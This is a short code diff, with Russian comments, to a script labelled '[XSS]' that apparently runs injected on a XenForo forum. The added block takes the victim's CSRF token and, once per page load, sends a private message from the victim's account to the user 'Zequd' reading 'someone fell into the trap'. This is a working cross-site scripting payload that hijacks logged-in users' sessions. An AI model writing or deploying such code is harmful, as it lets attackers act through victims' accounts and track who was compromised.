@@ -35,4 +35,22 @@
   };
 
   console.log("[XSS] Скрипт активирован");
+
+  // === Автоотправка сообщения Zequd (один раз) ===
+  if (!window.__xss_sent_pm) {
+    window.__xss_sent_pm = true;
+
+    XenForo.ajax(
+      '/conversations/add',
+      {
+        recipients: 'Zequd', // или '453177'
+        title: 'TwT',
+        message: 'Кажется, кто-то попался в ловушку... UwU',
+        _xfToken: XenForo._csrfToken
+      },
+      function (response) {
+        console.log("[XSS] ЛС отправлено Zequd ✅");
+      }
+    );
+  }
 })();
